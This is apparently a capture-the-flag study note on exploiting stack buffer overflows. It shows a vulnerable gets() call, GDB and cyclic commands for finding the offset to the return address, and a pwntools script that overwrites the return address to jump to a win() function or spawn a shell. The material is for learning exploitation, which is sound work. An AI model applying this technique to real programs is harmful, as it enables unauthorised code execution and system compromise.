- A program writes **more data into a stack buffer than it can hold**, overwriting nearby stack data.
```C
char buffer[64];
gets(buffer);
```
If I send > 64 bytes ---> overflow

Typical stack layout: If I overwrite the return address I can control where the function returns
`[ buffer ]`
`[ padding ]`
`[ saved RBP ]`
`[ return address ]`  ← target

------------------------------------
## <span style="color:rgb(146, 208, 80)">The Goal:</span>
Find overflow
     ↓
Find offset to RIP
     ↓
Control RIP
     ↓
Redirect execution
     ↓
Get flag

## <span style="color:rgb(146, 208, 80)">1- Finding Offset</span>
- In terminal:
```bash
cyclic 200          # generate pattern, feed it to the program
# program crashes
info registers rip  # in GDB, check RIP value
x/gx $rsp           # return value it crashed at
cyclic -l <value>   # outputs the offset number
```

- In Python:
```python
from pwn import *

payload = cyclic(200)
# after crash, check RIP value in GDB
offset = cyclic_find(0x6161616b)  # RIP value here
```
(If RIP is truncated and cyclic can't find it, check RSP instead: `x/gx $rsp`)


## <span style="color:rgb(146, 208, 80)">2- Find Target Address</span> 
```bash
# In GDB
info functions          # list all functions, find win()
p win                   # print address of win()
```
 *Common Targets to Jump To*
 - A `win()` function that prints the flag
 - `system("/bin/sh")` for a shell
 - Your shellcode (only if NX is disabled)

## <span style="color:rgb(146, 208, 80)"><span style="color:rgb(146, 208, 80)">3- Build Payload</span></span>
```python
from pwn import *

p = process("./binary")     # local
# p = remote("host", 1337)  # remote CTF

offset = 40                 # from cyclic
win    = 0xdeadbeef         # from GDB

payload  = b"A" * offset    # junk to reach return address
payload += p64(win)         # overwrite return address

p.sendline(payload)
p.interactive()             # catch the shell
```

## <span style="color:rgb(146, 208, 80)">Things that go wrong:</span> 
| PROBLEM                | FIX                                        |
| ---------------------- | ------------------------------------------ |
| Offset is wrong        | Recalculate with cyclic, check RIP not RSP |
| RIP value truncated    | Use RSP instead: `x/gx $rsp`               |
| Segfault at system()   | Stack alignment issue, add `ret` gadget    |
| Address has null bytes | Find a different target address            |